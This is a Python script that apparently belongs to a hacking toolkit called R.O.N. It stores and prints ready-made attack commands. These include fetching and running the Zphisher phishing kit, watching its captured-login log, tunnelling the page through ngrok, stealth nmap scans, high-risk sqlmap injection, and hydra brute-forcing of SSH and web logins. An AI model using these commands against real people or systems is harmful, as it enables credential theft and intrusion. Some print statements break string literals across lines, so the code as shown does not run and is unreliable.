#!/usr/bin/env python3
"""
R.O.N.... Task Helper - PLUG & PLAY Knowledge Base
Works with ANY ron.py version - ZERO main script changes!
Usage: python3 task_helper.py phishing
"""

import sqlite3
import sys
import os
from pathlib import Path
from datetime import datetime

class TaskHelper:
    def __init__(self):
        self.db_path = Path("/root/R.O.N/ron.db")
        self.conn = sqlite3.connect(self.db_path, check_same_thread=False)
        self.init_db()
    
    def init_db(self):
        """Create knowledge table if missing"""
        self.conn.execute('''CREATE TABLE IF NOT EXISTS knowledge 
            (id INTEGER PRIMARY KEY, category TEXT, query TEXT, answer TEXT, source TEXT)''')
        
        # PRELOAD KNOWLEDGE (Phishing, Nmap, etc)
        knowledge = [
            # PHISHING
            ("phishing", "zphisher setup", "git clone https://github.com/htr-tech/zphisher.git && cd Zphisher && bash zphisher.sh", "github"),
            ("phishing", "check creds", "tail -f Zphisher/logins.txt | grep SUCCESS", "local"),
            ("phishing", "ngrok tunnel", "./ngrok http 3333", "ngrok"),
            
            # NMAP
            ("nmap", "stealth scan", "nmap -sS -T2 --randomize-hosts -Pn target", "stealth"),
            ("nmap", "full scan", "nmap -sV -sC -O -p- target", "discovery"),
            ("nmap", "udp scan", "nmap -sU --top-ports 100 target", "udp"),
            
            # SQLMAP
            ("sqlmap", "basic", "sqlmap -u 'http://target.com?id=1' --batch --dbs", "basic"),
            ("sqlmap", "post data", "sqlmap -u 'http://target/login' --data='user=1&pass=1' --risk=3", "post"),
            
            # HYDRA
            ("hydra", "ssh brute", "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target", "ssh"),
            ("hydra", "http form", "hydra -l admin -P rockyou.txt target http-post-form '/login:user=^USER^&pass=^PASS^'", "web")
        ]
        
        cursor = self.conn.execute("SELECT query FROM knowledge")
        existing = {row[0] for row in cursor}
        
        with self.conn:
            for cat, q, cmd, src in knowledge:
                if q not in existing:
                    self.conn.execute("INSERT INTO knowledge (category, query, answer, source) VALUES (?, ?, ?, ?)", 
                                    (cat, q, cmd, src))
    
    def get_help(self, task):
        """Get task-specific commands"""
        cursor = self.conn.execute(
            "SELECT query, answer FROM knowledge WHERE category=? OR query LIKE ? LIMIT 5",
            (task, f"%{task}%")
        )
        return [{"query": row[0], "command": row[1]} for row in cursor.fetchall()]
    
    def add_knowledge(self, category, query, command):
        """Add custom knowledge"""
        with self.conn:
            self.conn.execute(
                "INSERT INTO knowledge (category, query, answer, source) VALUES (?, ?, ?, 'manual')",
                (category, query, command)
            )
        print(f"✅ Added: {category}/{query}")

def print_banner():
    print("""
╔══════════════════════════════════════════════════════╗
║  💡 R.O.N.... TASK HELPER - Knowledge Base 💡        ║
║  Usage: python3 task_helper.py [phishing|nmap|...]  ║
╚══════════════════════════════════════════════════════╝
    """)

def main():
    print_banner()
    
    if len(sys.argv) > 1:
        task = sys.argv[1].lower()
        helper = TaskHelper()
        cmds = helper.get_help(task)
        
        if cmds:
            print(f"
🧠 TASK HELP for '{task}':")
            print("-" * 60)
            for i, cmd in enumerate(cmds, 1):
                print(f"{i}. {cmd['query']}:")
                print(f"   {cmd['command']}
")
        else:
            print(f"❓ No help for '{task}'")
            print("Available: phishing, nmap, sqlmap, hydra")
    
    else:
        print("Commands:")
        print("  python3 task_helper.py phishing")
        print("  python3 task_helper.py nmap")
        print("  python3 task_helper.py sqlmap")

if __name__ == "__main__":
    main()
